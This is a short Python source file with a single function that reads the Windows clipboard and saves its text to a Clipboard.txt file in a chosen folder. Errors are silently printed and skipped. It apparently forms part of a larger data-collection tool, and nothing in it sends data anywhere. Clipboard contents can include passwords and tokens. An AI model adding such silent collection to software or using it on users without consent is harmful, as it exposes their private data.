import win32clipboard


def clipboard_data(path_dir: str) -> None:
    try:
        win32clipboard.OpenClipboard()
        data = win32clipboard.GetClipboardData()
        win32clipboard.CloseClipboard()
        if not data:
            return None
        with open(f'{path_dir}\\Clipboard.txt', "w", encoding='utf-8', errors='ignore') as file:
            file.write(str(data))
    except Exception as err:
        print(err)
        return None